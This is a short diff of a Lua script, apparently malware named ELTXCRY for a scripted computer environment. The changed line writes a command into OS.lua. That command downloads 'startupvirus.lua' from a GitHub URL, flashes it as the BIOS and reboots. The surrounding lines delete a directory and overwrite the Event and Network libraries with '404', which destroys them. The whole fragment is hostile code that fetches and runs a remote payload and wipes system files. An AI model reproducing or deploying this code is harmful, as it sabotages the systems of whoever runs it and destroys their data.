@@ -31,7 +31,7 @@ compressor.pack("/data-backup.pkg", {
 filesystem.remove("/eltxcry")
 -- Write ALL files
 
-filesystem.write("OS.lua", "shell.execute("wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot")")
+filesystem.write("OS.lua", "shell.execute(wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot)")
 filesystem.write("Libraries/Event.lua", "404")
 filesystem.write("Libraries/Network.lua", "404")
 
